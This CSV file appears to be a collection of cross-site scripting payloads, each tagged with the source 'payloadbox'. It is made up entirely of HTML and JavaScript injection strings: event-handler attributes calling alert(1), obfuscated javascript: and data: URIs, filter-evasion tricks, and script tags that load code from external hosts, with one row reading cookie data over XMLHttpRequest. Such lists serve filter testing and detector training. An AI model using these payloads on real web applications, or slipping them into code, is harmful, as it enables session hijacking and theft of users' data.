text,source
"<div id=""53""><xml id=""xss"" src=""test.htc""></xml>",payloadbox
<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,payloadbox
<body onorientationchange=alert(1)>,payloadbox
"<input onbeforecopy=alert(1) value=""XSS"" autofocus>",payloadbox
"<ins oncontextmenu=""alert(1)"">test</ins>",payloadbox
"<select ondblclick=""alert(1)"">test</select>",payloadbox
"<hgroup oncut=""alert(1)"" contenteditable>test</hgroup>",payloadbox
"<style>:target {color: red;}</style><blockquote id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></blockquote>",payloadbox
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>,payloadbox
<image id=x tabindex=1 onbeforeactivate=alert(1)></image>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>",payloadbox
<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>,payloadbox
"<progress draggable=""true"" ondragleave=""alert(1)"">test</progress>",payloadbox
"<slot draggable=""true"" ondragenter=""alert(1)"">test</slot>",payloadbox
"<IMG SRC=""mocha:[code]"">",payloadbox
"<a id=""x""><rect fill=""white"" width=""1000"" height=""1000""/></a>",payloadbox
"<?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">//[""'`-->]]>]</div>",payloadbox
"<noscript draggable=""true"" ondragenter=""alert(1)"">test</noscript>",payloadbox
"';a=prompt,a()//",payloadbox
<table id=x tabindex=1 onfocusin=alert(1)></table>,payloadbox
<ul id=x tabindex=1 onactivate=alert(1)></ul>,payloadbox
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,payloadbox
"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",payloadbox
"<meta onmouseover=""alert(1)"">test</meta>",payloadbox
"<audio onmouseout=""alert(1)"">test</audio>",payloadbox
<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>,payloadbox
"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #",payloadbox
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionend=alert(1)></th>",payloadbox
<svg><output onload=alert(1)></output>,payloadbox
"<time draggable=""true"" ondragstart=""alert(1)"">test</time>",payloadbox
<time id=x tabindex=1 onbeforeactivate=alert(1)></time>,payloadbox
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>,payloadbox
"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",payloadbox
"<source onclick=""alert(1)"">test</source>",payloadbox
"<applet draggable=""true"" ondragend=""alert(1)"">test</applet>",payloadbox
"<details onmousedown=""alert(1)"">test</details>",payloadbox
<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>,payloadbox
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=xx:x onerror=alert(108)></a>"">",payloadbox
"<style>:target {color: red;}</style><video id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></video>",payloadbox
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationstart=""alert(1)""></blockquote>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></button>",payloadbox
<svg><ol onload=alert(1)></ol>,payloadbox
<title id=x tabindex=1 onfocusin=alert(1)></title>,payloadbox
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",payloadbox
"<hgroup onmouseover=""alert(1)"">test</hgroup>",payloadbox
"<xmp onmouseover=""alert(1)"">test</xmp>",payloadbox
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,payloadbox
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",payloadbox
"<style>@keyframes slidein {}</style><article style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></article>",payloadbox
<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>,payloadbox
"<link onbeforepaste=""alert(1)"" contenteditable>test</link>",payloadbox
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onanimationend=""alert(1)""></datalist>",payloadbox
"<menu oncontextmenu=""alert(1)"">test</menu>",payloadbox
<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>,payloadbox
"<video controls autoplay ontimeupdate=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",payloadbox
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationstart=""alert(1)""></select>",payloadbox
"<content onbeforepaste=""alert(1)"" contenteditable>test</content>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>",payloadbox
"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></title>",payloadbox
"<output onmouseleave=""alert(1)"">test</output>",payloadbox
"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>",payloadbox
"<bgsound onmouseover=""alert(1)"">test</bgsound>",payloadbox
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><figcaption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></figcaption>",payloadbox
"<head onbeforecopy=""alert(1)"" contenteditable>test</head>",payloadbox
alert&#40;1&#41,payloadbox
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><tbody id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tbody>",payloadbox
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>",payloadbox
"<i oncontextmenu=""alert(1)"">test</i>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><dfn id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dfn>",payloadbox
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",payloadbox
"<b onmouseenter=""alert(1)"">test</b>",payloadbox
<svg><dfn onload=alert(1)></dfn>,payloadbox
"<object onmouseover=""alert(1)"">test</object>",payloadbox
"<summary onkeypress=""alert(1)"" contenteditable>test</summary>",payloadbox
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,payloadbox
"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",payloadbox
"<figcaption onbeforecopy=""alert(1)"" contenteditable>test</figcaption>",payloadbox
"<tbody onmousedown=""alert(1)"">test</tbody>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",payloadbox
"<plaintext onmousedown=""alert(1)"">test</plaintext>",payloadbox
"<progress onmouseup=""alert(1)"">test</progress>",payloadbox
"<menuitem onmousemove=""alert(1)"">test</menuitem>",payloadbox
"<plaintext onmouseenter=""alert(1)"">test</plaintext>",payloadbox
<math><brute href=javascript:alert(1)>click,payloadbox
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",payloadbox
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",payloadbox
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,payloadbox
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,payloadbox
"<pre onmouseup=""alert(1)"">test</pre>",payloadbox
"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>",payloadbox
<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>,payloadbox
<input type=checkbox id=x onfocus=alert(1)>,payloadbox
"<embed onkeyup=""alert(1)"" contenteditable>test</embed>",payloadbox
"<kbd oncontextmenu=""alert(1)"">test</kbd>",payloadbox
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",payloadbox
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>,payloadbox
"<data oncontextmenu=""alert(1)"">test</data>",payloadbox
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",payloadbox
"<! foo=""><script>alert(91)</script>"">",payloadbox
"<input draggable=""true"" ondragenter=""alert(1)"">test</input>",payloadbox
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationstart=""alert(1)""></applet>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",payloadbox
<em id=x tabindex=1 onfocus=alert(1)></em>,payloadbox
"<html draggable=""true"" ondragleave=""alert(1)"">test</html>",payloadbox
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",payloadbox
"<content onmouseleave=""alert(1)"">test</content>",payloadbox
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,payloadbox
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",payloadbox
"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></table>",payloadbox
"<base onmousedown=""alert(1)"">test</base>",payloadbox
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,payloadbox
"<keygen onmousemove=""alert(1)"">test</keygen>",payloadbox
"<rp onclick=""alert(1)"">test</rp>",payloadbox
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>",payloadbox
"<noframes onmousedown=""alert(1)"">test</noframes>",payloadbox
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,payloadbox
"<frame oncut=""alert(1)"" contenteditable>test</frame>",payloadbox
<th id=x tabindex=1 onfocus=alert(1)></th>,payloadbox
"<style>:target {color:red;}</style><figcaption id=x style=""transition:color 1s"" ontransitionend=alert(1)></figcaption>",payloadbox
"<br draggable=""true"" ondrag=""alert(1)"">test</br>",payloadbox
"<i onmouseup=""alert(1)"">test</i>",payloadbox
"<dd draggable=""true"" ondragend=""alert(1)"">test</dd>",payloadbox
"<nav onclick=""alert(1)"">test</nav>",payloadbox
"<html ondblclick=""alert(1)"">test</html>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",payloadbox
"<content oncontextmenu=""alert(1)"">test</content>",payloadbox
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,payloadbox
"<summary oncontextmenu=""alert(1)"">test</summary>",payloadbox
"<main onbeforecut=""alert(1)"" contenteditable>test</main>",payloadbox
"<bdi onmouseenter=""alert(1)"">test</bdi>",payloadbox
<em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>,payloadbox
"<multicol oncontextmenu=""alert(1)"">test</multicol>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>",payloadbox
"<label onmouseout=""alert(1)"">test</label>",payloadbox
<%78 onxxx=1,payloadbox
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,payloadbox
"<tbody onmouseleave=""alert(1)"">test</tbody>",payloadbox
"<body onmouseleave=""alert(1)"">test</body>",payloadbox
<multicol id=x tabindex=1 onactivate=alert(1)></multicol>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",payloadbox
<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>,payloadbox
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>",payloadbox
<keygen id=x tabindex=1 onactivate=alert(1)></keygen>,payloadbox
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",payloadbox
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",payloadbox
<col id=x tabindex=1 onfocusin=alert(1)></col>,payloadbox
"<shadow draggable=""true"" ondragleave=""alert(1)"">test</shadow>",payloadbox
"<time ondblclick=""alert(1)"">test</time>",payloadbox
"<legend onclick=""alert(1)"">test</legend>",payloadbox
"<p onpaste=""alert(1)"" contenteditable>test</p>",payloadbox
<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>,payloadbox
"<noembed ondblclick=""alert(1)"">test</noembed>",payloadbox
"<tr onmouseup=""alert(1)"">test</tr>",payloadbox
<svg><small onload=alert(1)></small>,payloadbox
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>",payloadbox
<script id=x tabindex=1 onfocus=alert(1)></script>,payloadbox
"<pre onmousemove=""alert(1)"">test</pre>",payloadbox
"<img draggable=""true"" ondragenter=""alert(1)"">test</img>",payloadbox
"<li onmouseup=""alert(1)"">test</li>",payloadbox
<form action=javascript:alert(1)><input type=submit>,payloadbox
"<p draggable=""true"" ondrag=""alert(1)"">test</p>",payloadbox
"<area onpaste=""alert(1)"" contenteditable>test</area>",payloadbox
"<svg onmousemove=""alert(1)"">test</svg>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>",payloadbox
<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>",payloadbox
"<figcaption draggable=""true"" ondragenter=""alert(1)"">test</figcaption>",payloadbox
"<multicol draggable=""true"" ondragleave=""alert(1)"">test</multicol>",payloadbox
"<embed oncopy=""alert(1)"" contenteditable>test</embed>",payloadbox
<body onhashchange=alert(1)><a href=#x>click this!#x,payloadbox
"<b onmouseout=""alert(1)"">test</b>",payloadbox
"<style onmouseup=""alert(1)"">test</style>",payloadbox
"<wbr onmousemove=""alert(1)"">test</wbr>",payloadbox
"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",payloadbox
"<map onmouseout=""alert(1)"">test</map>",payloadbox
"<style>@keyframes slidein {}</style><marquee style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></marquee>",payloadbox
"<frameset ondblclick=""alert(1)"">test</frameset>",payloadbox
<output id=x tabindex=1 onbeforeactivate=alert(1)></output>,payloadbox
"<thead ondblclick=""alert(1)"">test</thead>",payloadbox
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationend=""alert(1)""></base>",payloadbox
"<title draggable=""true"" ondragstart=""alert(1)"">test</title>",payloadbox
<nav id=x tabindex=1 onbeforeactivate=alert(1)></nav>,payloadbox
"<template onmouseenter=""alert(1)"">test</template>",payloadbox
<svg><caption onload=alert(1)></caption>,payloadbox
"<head onmouseover=""alert(1)"">test</head>",payloadbox
"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",payloadbox
%3Cx onxxx=alert(1),payloadbox
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,payloadbox
"<picture oncontextmenu=""alert(1)"">test</picture>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>",payloadbox
"<wbr onbeforecopy=""alert(1)"" contenteditable>test</wbr>",payloadbox
"<menu onpaste=""alert(1)"" contenteditable>test</menu>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>",payloadbox
"<font oncopy=""alert(1)"" contenteditable>test</font>",payloadbox
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",payloadbox
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationend=""alert(1)""></xmp>",payloadbox
<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>,payloadbox
<map id=x tabindex=1 onbeforedeactivate=alert(1)></map><input autofocus>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",payloadbox
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationend=""alert(1)""></rp>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></label>",payloadbox
"<html onmouseup=""alert(1)"">test</html>",payloadbox
"<optgroup onmousemove=""alert(1)"">test</optgroup>",payloadbox
"<small onpaste=""alert(1)"" contenteditable>test</small>",payloadbox
"<style>@keyframes slidein {}</style><tfoot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tfoot>",payloadbox
<command id=x tabindex=1 onbeforeactivate=alert(1)></command>,payloadbox
"<image onkeydown=""alert(1)"" contenteditable>test</image>",payloadbox
<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>,payloadbox
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationend=""alert(1)""></object>",payloadbox
"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>",payloadbox
"<style>@keyframes slidein {}</style><header style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></header>",payloadbox
<x onmouseout=alert(1)>hover this!,payloadbox
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationstart=""alert(1)""></rt>",payloadbox
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",payloadbox
<noembed onfocusout=alert(1) tabindex=1 id=x></noembed><input autofocus>,payloadbox
<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>,payloadbox
"<small onmouseleave=""alert(1)"">test</small>",payloadbox
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",payloadbox
"<command onkeypress=""alert(1)"" contenteditable>test</command>",payloadbox
"<style>:target {color: red;}</style><section id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></section>",payloadbox
"<i oncut=""alert(1)"" contenteditable>test</i>",payloadbox
"<nobr onbeforepaste=""alert(1)"" contenteditable>test</nobr>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>",payloadbox
"<source onmouseenter=""alert(1)"">test</source>",payloadbox
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,payloadbox
<marquee id=x tabindex=1 onfocus=alert(1)></marquee>,payloadbox
<dl id=x tabindex=1 onfocusin=alert(1)></dl>,payloadbox
"<div id=""113""><div id=""x"">XXX</div>",payloadbox
"<hgroup onmousedown=""alert(1)"">test</hgroup>",payloadbox
"<xmp onmousedown=""alert(1)"">test</xmp>",payloadbox
<wbr id=x tabindex=1 onactivate=alert(1)></wbr>,payloadbox
"<acronym onmouseup=""alert(1)"">test</acronym>",payloadbox
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,payloadbox
<output id=x tabindex=1 onfocusin=alert(1)></output>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>",payloadbox
"<content draggable=""true"" ondrag=""alert(1)"">test</content>",payloadbox
"<aside onmouseleave=""alert(1)"">test</aside>",payloadbox
<figcaption id=x tabindex=1 onbeforedeactivate=alert(1)></figcaption><input autofocus>,payloadbox
"<p oncontextmenu=""alert(1)"">test</p>",payloadbox
"<object ondblclick=""alert(1)"">test</object>",payloadbox
"<datalist ondblclick=""alert(1)"">test</datalist>",payloadbox
"<figcaption oncopy=""alert(1)"" contenteditable>test</figcaption>",payloadbox
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,payloadbox
<meta id=x tabindex=1 onfocusin=alert(1)></meta>,payloadbox
"<header onmouseenter=""alert(1)"">test</header>",payloadbox
"<listing onbeforecut=""alert(1)"" contenteditable>test</listing>",payloadbox
"<sup onkeypress=""alert(1)"" contenteditable>test</sup>",payloadbox
<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>,payloadbox
"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",payloadbox
"<sub onkeydown=""alert(1)"" contenteditable>test</sub>",payloadbox
"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",payloadbox
<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>,payloadbox
<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>,payloadbox
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",payloadbox
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,payloadbox
"<div onkeyup=""alert(1)"" contenteditable>test</div>",payloadbox
<svg><wbr onload=alert(1)></wbr>,payloadbox
"<rect  fill=""white"" style=""clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);""/>",payloadbox
<input autofocus onblur=alert(1)>,payloadbox
"<figure onmouseleave=""alert(1)"">test</figure>",payloadbox
"<strike onkeyup=""alert(1)"" contenteditable>test</strike>",payloadbox
<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>,payloadbox
"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",payloadbox
"<spacer ondblclick=""alert(1)"">test</spacer>",payloadbox
"<center draggable=""true"" ondragend=""alert(1)"">test</center>",payloadbox
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>,payloadbox
"<nav onmouseleave=""alert(1)"">test</nav>",payloadbox
"<tfoot ondblclick=""alert(1)"">test</tfoot>",payloadbox
"<picture onkeydown=""alert(1)"" contenteditable>test</picture>",payloadbox
"<fieldset onmouseover=""alert(1)"">test</fieldset>",payloadbox
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>",payloadbox
<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>,payloadbox
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>",payloadbox
"<colgroup onbeforepaste=""alert(1)"" contenteditable>test</colgroup>",payloadbox
"<element onkeydown=""alert(1)"" contenteditable>test</element>",payloadbox
"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>",payloadbox
"<dt onmouseleave=""alert(1)"">test</dt>",payloadbox
"<details onmousemove=""alert(1)"">test</details>",payloadbox
"<strong onpaste=""alert(1)"" contenteditable>test</strong>",payloadbox
<meter id=x tabindex=1 onactivate=alert(1)></meter>,payloadbox
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,payloadbox
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,payloadbox
"<var draggable=""true"" ondragstart=""alert(1)"">test</var>",payloadbox
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",payloadbox
"<section onbeforecut=""alert(1)"" contenteditable>test</section>",payloadbox
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",payloadbox
<script x> alert(1) </script 1=2,payloadbox
"<summary onmousedown=""alert(1)"">test</summary>",payloadbox
<label id=x tabindex=1 onfocusin=alert(1)></label>,payloadbox
<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><td id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></td>",payloadbox
"<thead onmouseup=""alert(1)"">test</thead>",payloadbox
"<nobr draggable=""true"" ondragstart=""alert(1)"">test</nobr>",payloadbox
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,payloadbox
"<track onclick=""alert(1)"">test</track>",payloadbox
"<iframe onmousemove=""alert(1)"">test</iframe>",payloadbox
"<nav onkeyup=""alert(1)"" contenteditable>test</nav>",payloadbox
<sub id=x tabindex=1 onfocus=alert(1)></sub>,payloadbox
"<form draggable=""true"" ondragleave=""alert(1)"">test</form>",payloadbox
<svg><pre onload=alert(1)></pre>,payloadbox
"<kbd onbeforepaste=""alert(1)"" contenteditable>test</kbd>",payloadbox
"<dfn onbeforepaste=""alert(1)"" contenteditable>test</dfn>",payloadbox
"<strike onmousedown=""alert(1)"">test</strike>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>",payloadbox
<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>,payloadbox
"<style>@keyframes slidein {}</style><strong style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strong>",payloadbox
"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>",payloadbox
"<menuitem oncopy=""alert(1)"" contenteditable>test</menuitem>",payloadbox
"<b onkeyup=""alert(1)"" contenteditable>test</b>",payloadbox
"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationstart=""alert(1)""></center>",payloadbox
<base href=//0>,payloadbox
"<div id=""dropbox"" style=""height: 360px;width: 500px;border: 5px solid #000;position: relative;"" ondragover=""event.preventDefault()"">+ Drop Box +</div>//[""'`-->]]>]</div>",payloadbox
"<label draggable=""true"" ondrag=""alert(1)"">test</label>",payloadbox
"<div id=""111""><div style=""background:url(/f#[a]oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""112""><div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div>",payloadbox
"<audio draggable=""true"" ondragenter=""alert(1)"">test</audio>",payloadbox
"<source draggable=""true"" ondragenter=""alert(1)"">test</source>",payloadbox
"<samp draggable=""true"" ondragleave=""alert(1)"">test</samp>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>",payloadbox
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",payloadbox
"</a>//[""'`-->]]>]</div>",payloadbox
"<small draggable=""true"" ondragstart=""alert(1)"">test</small>",payloadbox
"<fieldset draggable=""true"" ondrag=""alert(1)"">test</fieldset>",payloadbox
<img alt='%></xmp><img src=xx:x onerror=aler,payloadbox
"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>",payloadbox
"<svg onpaste=""alert(1)"" contenteditable>test</svg>",payloadbox
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>,payloadbox
"<image onkeyup=""alert(1)"" contenteditable>test</image>",payloadbox
<x ondrag=alert(1)>drag this!,payloadbox
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationend=""alert(1)""></abbr>",payloadbox
"<main draggable=""true"" ondrag=""alert(1)"">test</main>",payloadbox
